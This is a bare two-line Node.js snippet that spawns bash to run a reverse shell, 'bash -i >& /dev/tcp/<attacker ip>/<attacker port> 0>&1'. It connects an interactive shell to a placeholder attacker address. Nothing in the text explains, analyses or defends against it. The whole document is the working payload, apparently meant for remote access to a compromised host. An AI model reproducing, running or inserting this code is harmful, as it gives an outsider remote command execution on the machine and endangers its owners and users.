const { spawn } = require('child_process');
const process = spawn('bash', ['-c', 'bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1']);
